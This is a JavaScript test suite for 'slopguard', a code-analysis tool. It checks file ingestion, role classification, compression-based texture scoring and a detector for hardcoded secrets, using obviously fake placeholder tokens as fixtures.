'use strict';

// slopguard test runner — zero dependencies

var path = require('path');
var passed = 0;
var failed = 0;

function assert(condition, label) {
  if (condition) {
    passed++;
    process.stdout.write('  \x1b[32m✓\x1b[0m ' + label + '\n');
  } else {
    failed++;
    process.stderr.write('  \x1b[31m✗\x1b[0m ' + label + '\n');
  }
}

function section(name) {
  process.stdout.write('\n  \x1b[1m' + name + '\x1b[0m\n');
}

// --- Module loading ---
section('Module loading');

var fs = require('fs');
var fixturesDir = path.join(__dirname, 'fixtures');

try {
  require('../src/index.js');
  assert(true, 'src/index.js loads without error');
} catch (err) {
  assert(false, 'src/index.js loads without error: ' + err.message);
}

section('Rule unit tests — false-positive guards');

var rulesModule = require('../src/rules.js');
var ternaryRule = rulesModule.find(function (r) { return r.id === 'excessive-ternary-nesting'; });

// Actual nested ternary → must fire
var realTernary = "var x = a > 0 ? a > 10 ? a > 100 ? 'big' : 'med' : 'small' : 'neg';";
assert(ternaryRule.test(realTernary), 'excessive-ternary: fires on real nested ternary');

// Regex with ? quantifiers → must NOT fire (the reported false positive)
var regexLine = "const match = trimmed.match(/\\d+(?:\\.\\d+)+(?:-[0-9A-Za-z.-]+)?(?:\\+[0-9A-Za-z.-]+)?/);";
assert(!ternaryRule.test(regexLine), 'excessive-ternary: does NOT fire on regex with ? quantifiers');

// String literal containing ? → must NOT fire
var strLine = "var help = 'Is this ok? Maybe? Yes?';";
assert(!ternaryRule.test(strLine), 'excessive-ternary: does NOT fire on ? inside string literal');

// Optional chaining — should not be counted as ternary
var chainLine = "var v = foo?.bar?.baz?.qux;";
assert(!ternaryRule.test(chainLine), 'excessive-ternary: does NOT fire on optional chaining');


section('L00 — Project ingestion');

var L00 = require('../src/pipeline/L00-ingestion.js');

var registry = L00.buildRegistry(path.join(__dirname, 'fixtures'));
assert(Array.isArray(registry), 'buildRegistry returns an array');
assert(registry.length >= 3, 'registry has at least 3 fixture files (got ' + registry.length + ')');

// Shape check
var r0 = registry[0];
assert(typeof r0.path === 'string', 'record has path');
assert(typeof r0.relativePath === 'string', 'record has relativePath');
assert(typeof r0.ext === 'string', 'record has ext');
assert(typeof r0.size === 'number', 'record has size');
assert(typeof r0.depth === 'number', 'record has depth');
assert(typeof r0.territory === 'string', 'record has territory');
assert(r0.role === null, 'role is null before L01 runs');

// Territory classification
assert(L00.classifyTerritory('src/server/routes.js') === 'application', 'server/routes.js → application');
assert(L00.classifyTerritory('test/fixtures/clean.js') === 'test', 'test/fixtures/clean.js → test');
assert(L00.classifyTerritory('dist/bundle.js') === 'dist', 'dist/bundle.js → dist');
assert(L00.classifyTerritory('vendor/lodash.js') === 'vendor', 'vendor/lodash.js → vendor');
assert(L00.classifyTerritory('src/config/settings.js') === 'config', 'config/settings.js → config');
assert(L00.classifyTerritory('src/utils.js') === 'application', 'utils.js → application');

// Should skip node_modules
var projectReg = L00.buildRegistry(path.join(__dirname, '..'));
var nodeModFiles = projectReg.filter(function (r) { return r.path.indexOf('node_modules') !== -1; });
assert(nodeModFiles.length === 0, 'buildRegistry skips node_modules');

// test fixtures themselves should appear as territory=test or application depending on path
var serverRecords = registry.filter(function (r) { return r.relativePath.indexOf('server') !== -1; });
assert(serverRecords.length >= 1, 'server/ fixture files appear in registry');

// Single-file path support (Bug #1 fix)
var singleFileReg = L00.buildRegistry(path.join(__dirname, 'fixtures', 'clean.js'));
assert(Array.isArray(singleFileReg), 'buildRegistry(file) returns an array');
assert(singleFileReg.length === 1, 'buildRegistry(file) returns exactly 1 record (got ' + singleFileReg.length + ')');
assert(singleFileReg[0].relativePath === 'clean.js', 'single-file relativePath is the filename');
assert(singleFileReg[0].ext === '.js', 'single-file ext is .js');
assert(singleFileReg[0].size > 0, 'single-file size > 0');
assert(singleFileReg[0].depth === 0, 'single-file depth = 0');

// Single-file with unsupported extension returns empty
var txtReg = L00.buildRegistry(path.join(__dirname, '..', 'README.md'));
assert(txtReg.length === 0, 'buildRegistry(non-JS file) returns empty array');

// Non-existent path returns empty
var ghostReg = L00.buildRegistry('/tmp/does-not-exist-slopguard-test-xyz');
assert(ghostReg.length === 0, 'buildRegistry(nonexistent) returns empty array');

// Single JSX file
var jsxReg = L00.buildRegistry(path.join(__dirname, 'fixtures', 'component', 'App.jsx'));
assert(jsxReg.length === 1, 'buildRegistry(App.jsx) returns 1 record');
assert(jsxReg[0].ext === '.jsx', 'App.jsx ext is .jsx');

// --- L01 Role classification ---
section('L01 — File role classification');

var L01 = require('../src/pipeline/L01-role.js');

// Backend
var backendRecord = { relativePath: 'src/api/users.js', ext: '.js', territory: 'application' };
var backendRole = L01.classifyRole(backendRecord);
assert(backendRole.isBackend === true, 'api/users.js classified as backend');
assert(backendRole.isFrontend === false, 'api/users.js not classified as frontend');
assert(backendRole.contextType === 'backend', 'api/users.js contextType = backend');

// Frontend JSX
var frontendRecord = { relativePath: 'src/component/App.jsx', ext: '.jsx', territory: 'application' };
var frontendRole = L01.classifyRole(frontendRecord);
assert(frontendRole.isFrontend === true, 'component/App.jsx classified as frontend');
assert(frontendRole.isBackend === false, 'component/App.jsx not classified as backend');
assert(frontendRole.contextType === 'frontend', 'component/App.jsx contextType = frontend');

// Declaration file
var dtsRecord = { relativePath: 'types/index.d.ts', ext: '.ts', territory: 'application' };
var dtsRole = L01.classifyRole(dtsRecord);
assert(dtsRole.isDeclaration === true, 'index.d.ts isDeclaration = true');
assert(dtsRole.fileType === 'declaration', 'index.d.ts fileType = declaration');

// Test file
var testRecord = { relativePath: 'test/fixtures/clean.js', ext: '.js', territory: 'test' };
var testRole = L01.classifyRole(testRecord);
assert(testRole.isTest === true, 'test fixture isTest = true');

// role is set on the record in place
assert(testRecord.role !== null, 'classifyRole mutates fileRecord.role in place');
assert(testRecord.role.isTest === true, 'mutated role.isTest = true');

// Isomorphic (neither backend nor frontend signals)
var isoRecord = { relativePath: 'src/utils.js', ext: '.js', territory: 'application' };
var isoRole = L01.classifyRole(isoRecord);
assert(isoRole.contextType === 'isomorphic', 'utils.js contextType = isomorphic');

// L01 applied to full registry
var fullReg = L00.buildRegistry(path.join(__dirname, 'fixtures'));
fullReg.forEach(function (rec) { L01.classifyRole(rec); });
var allHaveRole = fullReg.every(function (rec) { return rec.role !== null; });
assert(allHaveRole, 'all registry records have role after L01 applied to registry');

// --- L02 Surface Characterisation ---
section('L02 — Surface characterisation');

var L02 = require('../src/pipeline/L02-surface.js');

// Minified fixture: single long line → minified: true
var minifiedContent = fs.readFileSync(path.join(fixturesDir, 'minified.js'), 'utf8');
var minifiedSurface = L02.characteriseFile(minifiedContent);
assert(minifiedSurface.minified === true, 'minified.js → minified: true');

// Repetitive fixture: many near-identical blocks → repetitionFraction > 0.4
var repetitiveContent = fs.readFileSync(path.join(fixturesDir, 'repetitive.js'), 'utf8');
var repSurface = L02.characteriseFile(repetitiveContent);
assert(repSurface.repetitionFraction > 0.4, 'repetitive.js → repetitionFraction > 0.4 (got ' + repSurface.repetitionFraction.toFixed(3) + ')');
assert(repSurface.minified === false, 'repetitive.js → minified: false');

// Clean fixture: normal human JS → both flags false
var cleanContent = fs.readFileSync(path.join(fixturesDir, 'clean.js'), 'utf8');
var cleanSurface = L02.characteriseFile(cleanContent);
assert(cleanSurface.minified === false, 'clean.js → minified: false');
assert(cleanSurface.repetitionFraction < 0.4, 'clean.js → repetitionFraction < 0.4 (got ' + cleanSurface.repetitionFraction.toFixed(3) + ')');

// Surface shape
assert(typeof cleanSurface.routingDensity === 'number', 'surface has routingDensity');
assert(typeof cleanSurface.avgLineLength === 'number', 'surface has avgLineLength');
assert(Array.isArray(cleanSurface.lineDistribution), 'surface has lineDistribution array');
assert(cleanSurface.lineDistribution.length === 4, 'lineDistribution has 4 buckets');
assert(typeof cleanSurface.whitespaceRatio === 'number', 'surface has whitespaceRatio');

// routingDensity is between 0 and 1
assert(cleanSurface.routingDensity >= 0 && cleanSurface.routingDensity <= 1, 'routingDensity in [0,1] (got ' + cleanSurface.routingDensity.toFixed(3) + ')');

// whitespaceRatio is between 0 and 1
assert(cleanSurface.whitespaceRatio > 0 && cleanSurface.whitespaceRatio < 1, 'whitespaceRatio in (0,1) (got ' + cleanSurface.whitespaceRatio.toFixed(3) + ')');

// lineDistribution sums to ~1
var distSum = cleanSurface.lineDistribution.reduce(function (a, b) { return a + b; }, 0);
assert(Math.abs(distSum - 1) < 0.01, 'lineDistribution sums to 1 (got ' + distSum.toFixed(3) + ')');

// Empty content → safe zero values
var emptySurface = L02.characteriseFile('');
assert(emptySurface.minified === false, 'empty content → minified: false');
assert(emptySurface.repetitionFraction === 0, 'empty content → repetitionFraction: 0');

// characteriseRecord mutates fileRecord.surface in place
var fakeRecord = { relativePath: 'test.js', surface: null };
L02.characteriseRecord(fakeRecord, cleanContent);
assert(fakeRecord.surface !== null, 'characteriseRecord sets fileRecord.surface');
assert(typeof fakeRecord.surface.routingDensity === 'number', 'characteriseRecord result has routingDensity');

// --- L03 Compression Texture Analysis ---
section('L03 — Compression texture analysis');

var L03 = require('../src/pipeline/L03-compression.js');

// selfCompressionRatio: between 0 and 1 for real code
var l03Human = fs.readFileSync(path.join(fixturesDir, 'clean.js'), 'utf8');
var l03HumanRatio = L03.selfCompressionRatio(l03Human);
assert(l03HumanRatio > 0 && l03HumanRatio < 1, 'L03 self-ratio for human code in (0,1) (got ' + l03HumanRatio.toFixed(3) + ')');

// Repetitive AI fixture compresses more (lower ratio) than varied human code
var l03RepContent = fs.readFileSync(path.join(fixturesDir, 'repetitive.js'), 'utf8');
var l03RepRatio = L03.selfCompressionRatio(l03RepContent);
assert(l03RepRatio < l03HumanRatio, 'repetitive.js self-ratio < clean.js self-ratio (' + l03RepRatio.toFixed(3) + ' < ' + l03HumanRatio.toFixed(3) + ')');

// NCD: content with itself should be low
var l03SelfNcd = L03.ncd(l03Human, l03Human);
assert(l03SelfNcd < 0.3, 'NCD(content, itself) < 0.3 (got ' + l03SelfNcd.toFixed(3) + ')');

// NCD: different content should be higher than self-NCD
var l03Sloppy = fs.readFileSync(path.join(fixturesDir, 'sloppy.js'), 'utf8');
var l03DiffNcd = L03.ncd(l03Human, l03Sloppy);
assert(l03DiffNcd > l03SelfNcd, 'NCD of different files > self-NCD');

// segmentedCompression: returns array of segment objects
var l03Segments = L03.segmentedCompression(l03RepContent, 10);
assert(Array.isArray(l03Segments), 'segmentedCompression returns array');
assert(l03Segments.length > 1, 'segmented result has more than 1 window (got ' + l03Segments.length + ')');
assert(typeof l03Segments[0].startLine === 'number', 'segment has startLine');
assert(typeof l03Segments[0].endLine === 'number', 'segment has endLine');
assert(typeof l03Segments[0].ratio === 'number', 'segment has ratio');

// Short file: returns single segment
var l03Short = 'var x = 1;\nvar y = 2;\n';
var l03ShortSeg = L03.segmentedCompression(l03Short, 30);
assert(l03ShortSeg.length === 1, 'short file → single segment');

// analyseFile: populates fileRecord.compression
var l03Record = { relativePath: 'clean.js', compression: null };
var l03Result = L03.analyseFile(l03Record, l03Human);
assert(l03Record.compression !== null, 'analyseFile mutates fileRecord.compression');
assert(typeof l03Result.selfRatio === 'number', 'result has selfRatio');
assert(typeof l03Result.compressionScore === 'number', 'result has compressionScore');
assert(l03Result.compressionScore >= 0 && l03Result.compressionScore <= 100, 'compressionScore in [0,100]');
assert(Array.isArray(l03Result.segmentScores), 'result has segmentScores array');
assert(l03Result.projectOutlierScore === 0, 'projectOutlierScore is 0 placeholder until L12');

// analyseFile with null fileRecord (standalone call)
var l03Standalone = L03.analyseFile(null, l03Human);
assert(typeof l03Standalone.selfRatio === 'number', 'standalone analyseFile returns result');

// Repetitive fixture should score higher than clean fixture
var l03RepResult = L03.analyseFile(null, l03RepContent);
assert(l03RepResult.compressionScore >= l03Result.compressionScore, 'repetitive.js compression score >= clean.js (' + l03RepResult.compressionScore + ' >= ' + l03Result.compressionScore + ')');

// ============================================================
// src/string/ pipeline (Phase 6)
// ============================================================

section('String pipeline — decomposer');

var strDecomp = require('../src/string/decomposer.js');

// Semicolon KV strategy
var sdMx = strDecomp.decompose('sketch=0;rounded=1;arcSize=50;fillColor=#3aa7ff;strokeColor=#ddd');
assert(sdMx.decomposed === true, 'str-decompose: mxGraph style decomposes');
assert(sdMx.values.indexOf('#3aa7ff') !== -1, 'str-decompose: hex color value extracted');

// Compound with embedded secret
var sdComp = strDecomp.decompose('user=admin;password=Xk7mR9qL2;host=db.prod.internal');
assert(sdComp.decomposed === true, 'str-decompose: compound kv decomposes');
assert(sdComp.values.indexOf('Xk7mR9qL2') !== -1, 'str-decompose: embedded password extracted');

// URL query params
var sdUrl = strDecomp.decompose('https://api.example.com/v1?user=bob&token=abc123&format=json');
assert(sdUrl.decomposed === true, 'str-decompose: URL query params decompose');
assert(sdUrl.values.indexOf('abc123') !== -1, 'str-decompose: token value extracted');

// JSON fragment
var sdJson = strDecomp.decompose('{"name": "Alice", "role": "admin"}');
assert(sdJson.decomposed === true, 'str-decompose: JSON fragment decomposes');
assert(sdJson.values.indexOf('Alice') !== -1, 'str-decompose: JSON value Alice extracted');

// Plain API key passes through unchanged
var sdPlain = strDecomp.decompose('sk_live_abc123def456ghi789jkl012mno345');
assert(sdPlain.decomposed === false, 'str-decompose: plain API key not decomposed');
assert(sdPlain.values[0] === 'sk_live_abc123def456ghi789jkl012mno345', 'str-decompose: plain key value preserved');

// Null/empty input
assert(strDecomp.decompose('').decomposed === false, 'str-decompose: empty string → not decomposed');

section('String pipeline — char-frequency');

var strCF = require('../src/string/char-frequency.js');

// API key → high signal
var scfApi = strCF.analyse('sk_live_abc123def456ghi789jkl012mno345');
assert(scfApi.signal > 0.4, 'str-cf: API key signal > 0.4 (got ' + scfApi.signal.toFixed(3) + ')');
assert(scfApi.entropy > 3.0, 'str-cf: API key entropy > 3.0 (got ' + scfApi.entropy.toFixed(3) + ')');

// English-like → low signal
var scfEng = strCF.analyse('this is a normal variable name for testing');
assert(scfEng.signal < 0.5, 'str-cf: English-like signal < 0.5 (got ' + scfEng.signal.toFixed(3) + ')');

// Output shape
assert(typeof scfApi.distanceFromCode   === 'number', 'str-cf: result has distanceFromCode');
assert(typeof scfApi.distanceFromSecret === 'number', 'str-cf: result has distanceFromSecret');

// Edge: short string
var scfShort = strCF.analyse('a');
assert(scfShort.signal === 0.5, 'str-cf: single char returns neutral signal 0.5');

section('String pipeline — bigram');

var strBg = require('../src/string/bigram.js');

// Random token → high signal
var sbgRand = strBg.analyse('Xk7mR9qL2wF5nT3vBj8');
assert(sbgRand.signal > 0.5, 'str-bg: random token bigram signal > 0.5 (got ' + sbgRand.signal.toFixed(3) + ')');
assert(typeof sbgRand.bigramEntropy === 'number', 'str-bg: has bigramEntropy');
assert(typeof sbgRand.charEntropy   === 'number', 'str-bg: has charEntropy');
assert(typeof sbgRand.ratio         === 'number', 'str-bg: has ratio');

// Structured string → low signal
var sbgStruct = strBg.analyse('aaabbbcccdddeeefffggg');
assert(sbgStruct.signal < 0.5, 'str-bg: structured string bigram signal < 0.5 (got ' + sbgStruct.signal.toFixed(3) + ')');

// Short string → neutral
assert(strBg.analyse('abc').signal === 0.5, 'str-bg: short string → neutral 0.5');

section('String pipeline — compression');

var strComp = require('../src/string/compression.js');

// Short string: null
assert(strComp.analyse('short') === null, 'str-comp: <=50 chars returns null');

// Long repetitive: low signal
var scRepeat = '';
for (var scri = 0; scri < 10; scri++) scRepeat += 'function getData() { return data; } ';
var scRepResult = strComp.analyse(scRepeat);
assert(scRepResult !== null, 'str-comp: long repetitive returns non-null');
assert(scRepResult.signal < 0.5, 'str-comp: repetitive string signal < 0.5 (got ' + scRepResult.signal.toFixed(3) + ')');
assert(typeof scRepResult.ratio === 'number', 'str-comp: result has ratio');

section('String pipeline — aggregator');

var strAgg = require('../src/string/aggregator.js');

// Known API key → ambiguous (mixed signals) or secret
var saggApi = strAgg.aggregate('sk_live_abc123def456ghi789jkl012mno345');
assert(typeof saggApi.score     === 'number',  'str-agg: API key has numeric score');
assert(typeof saggApi.decided   === 'boolean', 'str-agg: API key has decided boolean');
assert(typeof saggApi.ambiguous === 'boolean', 'str-agg: API key has ambiguous boolean');
assert(typeof saggApi.signals   === 'object',  'str-agg: result has signals object');
assert(saggApi.decided !== saggApi.ambiguous,  'str-agg: decided and ambiguous are mutually exclusive');

// English text → decided safe
var saggEng = strAgg.aggregate('this is a normal english sentence for testing purposes longer text');
assert(saggEng.score < 50, 'str-agg: English text score < 50 (got ' + saggEng.score + ')');

section('String pipeline — vector engine');

var strVec = require('../src/string/vector.js');

// Real API key → isSecret=true or score >= 0.5
var svApi = strVec.score('sk_live_abc123def456ghi789jkl012mno345');
assert(svApi.score >= 0.5, 'str-vec: API key score >= 0.5 (got ' + svApi.score.toFixed(3) + ')');
assert(svApi.isSecret === true, 'str-vec: API key isSecret=true');
assert(Array.isArray(svApi.dimensions) && svApi.dimensions.length === 6, 'str-vec: result has 6 dimensions');

// English text → isSecret=false
var svEng = strVec.score('this is a normal english sentence for testing purposes and more text');
assert(svEng.isSecret === false, 'str-vec: English text isSecret=false');
assert(svEng.score < 0.5, 'str-vec: English text score < 0.5 (got ' + svEng.score.toFixed(3) + ')');

// Threshold constant exposed
assert(strVec.THRESHOLD === 0.50, 'str-vec: THRESHOLD is 0.50');

// Empty string
var svEmpty = strVec.score('');
assert(svEmpty.score === 0, 'str-vec: empty string score is 0');

section('String pipeline — vector worker');

var strWorker = require('../src/string/vector-worker.js');

var swBatch = [
  { index: 0, value: 'sk_live_abc123def456ghi789jkl012mno345' },
  { index: 1, value: 'this is normal english text for testing' },
];

strWorker.runBatch(swBatch).then(function (swResults) {
  assert(swResults.length === 2, 'str-worker: batch returns 2 results');
  assert(swResults[0].score >= 0.5, 'str-worker: API key score >= 0.5 (got ' + swResults[0].score.toFixed(3) + ')');
  assert(swResults[1].score < 0.5,  'str-worker: English text score < 0.5 (got ' + swResults[1].score.toFixed(3) + ')');
  assert(swResults[0].index === 0,  'str-worker: result preserves index');

  // Empty batch
  return strWorker.runBatch([]);
}).then(function (swEmpty) {
  assert(swEmpty.length === 0, 'str-worker: empty batch returns empty array');
}).catch(function (err) {
  process.stderr.write('String worker test error: ' + err.message + '\n');
  process.exit(1);
});

// --- L04 Entity Harvesting ---
section('L04 Entity Harvesting');

var L04 = require('../src/pipeline/L04-harvest.js');
var l04Line1 = "var DB_HOST = 'db.prod.internal';";
var l04Strings1 = L04._extractStringsFromLine(l04Line1, 0);
assert(l04Strings1.length >= 1, 'extractStringsFromLine finds single-quoted string');
assert(l04Strings1[0].value === 'db.prod.internal', 'extracted value matches');
assert(l04Strings1[0].identifierName === 'DB_HOST', 'extracted identifierName matches');
assert(l04Strings1[0].lineIndex === 0, 'lineIndex is 0');
assert(l04Strings1[0].type === 'string', 'type is string');

// String extraction: double-quoted
var l04Line2 = 'var region = "us-east-1";';
var l04Strings2 = L04._extractStringsFromLine(l04Line2, 5);
assert(l04Strings2.length >= 1, 'extractStringsFromLine finds double-quoted string');
assert(l04Strings2[0].lineIndex === 5, 'lineIndex is 5');

// URL extraction: extracts https URL
var l04LineUrl = 'var endpoint = "https://api.example.com/v2/data";';
var l04Urls = L04._extractUrlsFromLine(l04LineUrl, 2);
assert(l04Urls.length >= 1, 'extractUrlsFromLine finds URL');
assert(l04Urls[0].type === 'url', 'URL candidate has type url');
assert(l04Urls[0].value.indexOf('https://') === 0, 'URL value starts with https://');

// URL extraction: skips comment-only lines
var l04LineComment = '// see https://docs.example.com for details';
var l04CommentUrls = L04._extractUrlsFromLine(l04LineComment, 0);
assert(l04CommentUrls.length === 0, 'URL extraction skips comment lines');

// Short strings below MIN_LEN are dropped
var l04ShortLine = "var x = 'ab';";
var l04Short = L04._extractStringsFromLine(l04ShortLine, 0);
assert(l04Short.length === 0, 'strings < 4 chars are discarded');

// Gravity Welder: non-adjacent items are not fused
var l04Cands = [
  { value: 'hello', line: 'hello', col: 0, lineIndex: 0, identifierName: null, callSiteContext: null, type: 'string', priority: 'normal' },
  { value: 'world', line: 'world', col: 0, lineIndex: 5, identifierName: null, callSiteContext: null, type: 'string', priority: 'normal' },
];
var l04Welded = L04._gravityWeld(l04Cands);
assert(l04Welded.length === 2, 'gravity weld: non-adjacent candidates not fused (lineDelta > 1)');

// harvestEntities: fixture produces candidates and mutates record
var l04FixtureContent = require('fs').readFileSync(path.join(fixturesDir, 'harvest-config.js'), 'utf8');
var l04Record = { candidates: null };
var l04Candidates = L04.harvestEntities(l04FixtureContent, l04Record);
assert(Array.isArray(l04Candidates), 'harvestEntities returns array');
assert(l04Candidates.length > 0, 'fixture produces at least one candidate (got ' + l04Candidates.length + ')');
assert(l04Record.candidates === l04Candidates, 'harvestEntities mutates fileRecord.candidates');

// harvestEntities with null record (standalone call)
var l04Standalone = L04.harvestEntities(l04FixtureContent, null);
assert(Array.isArray(l04Standalone), 'harvestEntities standalone returns array');

// --- L05 Pre-Flight Gate ---
section('L05 Pre-Flight Gate');

var L05 = require('../src/pipeline/L05-preflight.js');

// lineRoutingDensity: high symbol density line
var l05Dense = '};(){[]}<>';
assert(L05._lineRoutingDensity(l05Dense) > 0.35, 'dense symbol line has routing density > 0.35');

// lineRoutingDensity: plain text line
var l05Plain = 'var host = "db.prod.internal";';
assert(L05._lineRoutingDensity(l05Plain) < 0.35, 'plain text line has routing density < 0.35');

// classTransitionCount: token with many transitions
var l05Transitions = L05._classTransitionCount('ghp_ABCDEF123');
assert(l05Transitions >= 3, 'token with mixed chars has >= 3 transitions');

// classTransitionCount: uniform lowercase
var l05Uniform = L05._classTransitionCount('abcdefgh');
assert(l05Uniform === 0, 'uniform lowercase has 0 transitions');

// hash: same string same hash
assert(L05._hash('hello') === L05._hash('hello'), 'hash is deterministic');
assert(L05._hash('hello') !== L05._hash('world'), 'different strings have different hashes');

// preflight: discards duplicate values
var l05DupCands = [
  { value: 'secret-value-abc', line: 'var x = "secret-value-abc"', col: 0, lineIndex: 0, type: 'string', priority: 'normal' },
  { value: 'secret-value-abc', line: 'var y = "secret-value-abc"', col: 0, lineIndex: 1, type: 'string', priority: 'normal' },
];
var l05Deduped = L05.preflight(l05DupCands, null);
assert(l05Deduped.length === 1, 'preflight deduplicates identical values');

// preflight: discards logic-graph lines
var l05StructuralCands = [
  { value: 'something-long', line: '};(){[]}<>;(){', col: 0, lineIndex: 0, type: 'string', priority: 'normal' },
];
var l05Filtered = L05.preflight(l05StructuralCands, null);
assert(l05Filtered.length === 0, 'preflight discards candidates from high-density structural lines');

// preflight: keeps normal candidates
var l05NormalCands = [
  { value: 'db.prod.internal', line: 'var DB_HOST = "db.prod.internal"', col: 0, lineIndex: 0, type: 'string', priority: 'normal' },
];
var l05Kept = L05.preflight(l05NormalCands, null);
assert(l05Kept.length === 1, 'preflight keeps normal candidates');

// preflight: marks blobs
var l05BlobValue = 'x'.repeat(2001);
var l05BlobCands = [
  { value: l05BlobValue, line: 'var x = "' + l05BlobValue.slice(0, 5) + '"', col: 0, lineIndex: 0, type: 'string', priority: 'normal' },
];
var l05BlobResult = L05.preflight(l05BlobCands, null);
assert(l05BlobResult.length === 1 && l05BlobResult[0].priority === 'blob', 'preflight classifies oversized values as blob');

// _isStyleLiteral: detects semicolon-delimited key=value style strings
assert(L05._isStyleLiteral('fillColor=#03B5BB;gradientColor=none;') === true, 'CSS-like style string is style literal');
assert(L05._isStyleLiteral('dashed=0;html=1;shape=mxgraph.aws2.analytics') === true, 'SVG style attributes are style literal');
assert(L05._isStyleLiteral('rounded=1;whiteSpace=wrap;html=1;arcSize=50;') === true, 'draw.io style string is style literal');
assert(L05._isStyleLiteral('strokeColor=#f69721;fillColor=none;gradientColor=none;') === true, 'color style string is style literal');
assert(L05._isStyleLiteral('ghp_ABCDEFghijkl1234567890abcdef') === false, 'GitHub PAT is NOT style literal');
assert(L05._isStyleLiteral('sk-proj-abcdef1234567890') === false, 'API key is NOT style literal');
assert(L05._isStyleLiteral('hello world') === false, 'plain text is NOT style literal');
assert(L05._isStyleLiteral('a=b') === false, 'single k=v with no semicolons is NOT style literal');
assert(L05._isStyleLiteral('just;semicolons;here') === false, 'semicolons without = are NOT style literal');

// preflight: discards style-literal strings
var l05StyleCands = [
  { value: 'fillColor=#03B5BB;gradientColor=none;', line: 'var s = "fillColor=#03B5BB;gradientColor=none;"', col: 0, lineIndex: 0, type: 'string', priority: 'normal' },
  { value: 'ghp_ABCDEFghijkl1234567890ab', line: 'var token = "ghp_ABCDEFghijkl1234567890ab"', col: 0, lineIndex: 1, type: 'string', priority: 'normal' },
];
var l05StyleResult = L05.preflight(l05StyleCands, null);
assert(l05StyleResult.length === 1, 'preflight discards style literal, keeps real token (got ' + l05StyleResult.length + ')');
assert(l05StyleResult[0].value.indexOf('ghp_') === 0, 'kept candidate is the real token, not the style string');

// preflight: does not discard url-type candidates that look like style strings
var l05UrlStyleCands = [
  { value: 'fillColor=#03B5BB;gradientColor=none;', line: 'var s = "fillColor=#03B5BB;gradientColor=none;"', col: 0, lineIndex: 0, type: 'url', priority: 'normal' },
];
var l05UrlStyleResult = L05.preflight(l05UrlStyleCands, null);
assert(l05UrlStyleResult.length === 1, 'preflight keeps url-type candidates even if they look like style strings');

// _isDottedPathLiteral: i18n/l10n key detection
assert(L05._isDottedPathLiteral('auth.login.invalid_password') === true,  'i18n key with underscores is dotted-path');
assert(L05._isDottedPathLiteral('user.profile.avatar_url') === true,      'i18n key with underscore in leaf is dotted-path');
assert(L05._isDottedPathLiteral('errors.not_found') === true,              'two-segment i18n key is dotted-path');
assert(L05._isDottedPathLiteral('Auth.Login.Invalid_Password') === true,   'PascalCase i18n key with underscore is dotted-path');
assert(L05._isDottedPathLiteral('db.prod.internal') === false,             'hostname without underscore is NOT dotted-path');
assert(L05._isDottedPathLiteral('com.example.app') === false,              'package name without underscore is NOT dotted-path');
assert(L05._isDottedPathLiteral('server.db.host') === false,               'config key without underscore is NOT dotted-path');
assert(L05._isDottedPathLiteral('sk-proj-abc123def456') === false,         'API key is NOT dotted-path');
assert(L05._isDottedPathLiteral('hello world') === false,                  'string with spaces is NOT dotted-path');
assert(L05._isDottedPathLiteral('just-one-word') === false,                'no dots is NOT dotted-path');
assert(L05._isDottedPathLiteral('.leading.dot_key') === false,             'leading dot is NOT dotted-path');
assert(L05._isDottedPathLiteral('a.b') === false,                          'two-segment path without underscore is NOT dotted-path');

// preflight: discards dotted-path literals (i18n false-positive guard)
var l05I18nCands = [
  { value: 'auth.login.invalid_password', line: 'var k = "auth.login.invalid_password"', col: 0, lineIndex: 0, type: 'string', priority: 'normal' },
  { value: 'ghp_ABCDEFghijkl1234567890ab', line: 'var t = "ghp_ABCDEFghijkl1234567890ab"', col: 0, lineIndex: 1, type: 'string', priority: 'normal' },
];
var l05I18nResult = L05.preflight(l05I18nCands, null);
assert(l05I18nResult.length === 1,                   'preflight discards i18n key, keeps real token');
assert(l05I18nResult[0].value.indexOf('ghp_') === 0, 'kept candidate is the token, not the i18n key');

// --- L12 Project-Level Calibration ---
section('L12 — Project-level calibration');

var L12 = require('../src/pipeline/L12-calibration.js');

// --- Statistical helpers ---
assert(L12._median([1, 2, 3, 4, 5]) === 3, 'L12 _median: odd-length array');
assert(L12._median([1, 2, 3, 4]) === 2.5, 'L12 _median: even-length array');
assert(L12._median([]) === 0, 'L12 _median: empty array → 0');
assert(L12._mad([1, 1, 2, 2, 4, 6, 9], 2) === 1, 'L12 _mad: known dataset');
assert(L12._mad([], 0) === 0, 'L12 _mad: empty → 0');

// --- Bayesian self-calibration weight ---
assert(L12._selfCalibrationWeight(5) === 0, 'L12 selfWeight: 5 files → 0 (trust global)');
assert(L12._selfCalibrationWeight(10) === 0, 'L12 selfWeight: 10 files → 0');
assert(L12._selfCalibrationWeight(100) === 1, 'L12 selfWeight: 100 files → 1 (full self-calibrate)');
assert(L12._selfCalibrationWeight(200) === 1, 'L12 selfWeight: 200 files → 1');
var l12Mid = L12._selfCalibrationWeight(55);
assert(l12Mid > 0 && l12Mid < 1, 'L12 selfWeight: 55 files → between 0 and 1 (got ' + l12Mid.toFixed(2) + ')');

// --- Empty registry ---
var l12Empty = L12.calibrate([]);
assert(l12Empty.entropyMAD === 0, 'L12 empty: entropyMAD is 0');
assert(l12Empty.compressionBaseline === 0, 'L12 empty: compressionBaseline is 0');
assert(Object.keys(l12Empty.confidenceMultipliers).length === 0, 'L12 empty: no multipliers');

// --- Confidence multipliers: dense category → downweighted ---
var l12MultReg = [];
for (var l12i = 0; l12i < 10; l12i++) {
  l12MultReg.push({
    findings: [], compression: {},
    patternHits: [{ category: 'verbosity' }],
  });
}
var l12MultResult = L12.calibrate(l12MultReg);
assert(l12MultResult.confidenceMultipliers.verbosity !== undefined, 'L12 multipliers: verbosity key exists');
assert(l12MultResult.confidenceMultipliers.verbosity < 1, 'L12 multipliers: verbosity hits all files → downweighted (got ' + l12MultResult.confidenceMultipliers.verbosity + ')');

// --- Multipliers: rare category → full weight ---
var l12RareReg = [];
for (var l12j = 0; l12j < 10; l12j++) {
  l12RareReg.push({ findings: [], compression: {}, patternHits: l12j === 0 ? [{ category: 'security' }] : [] });
}
var l12RareResult = L12.calibrate(l12RareReg);
assert(l12RareResult.confidenceMultipliers.security === 1, 'L12 multipliers: security hits 1/10 files → full weight');

// --- Calibration mutates findings: large project with uniform scores → downgrade ---
// Build 100+ file registry where all findings have pipelineScore = 0.55
var l12BigReg = [];
for (var l12k = 0; l12k < 110; l12k++) {
  l12BigReg.push({
    findings: [{ value: 'test', pipelineScore: 0.55, confidence: 'MEDIUM', lineIndex: 0 }],
    compression: { selfRatio: 0.30 },
    patternHits: [],
  });
}
var l12BigResult = L12.calibrate(l12BigReg);
assert(l12BigResult.selfCalibrationWeight === 1, 'L12 big project: selfWeight = 1');
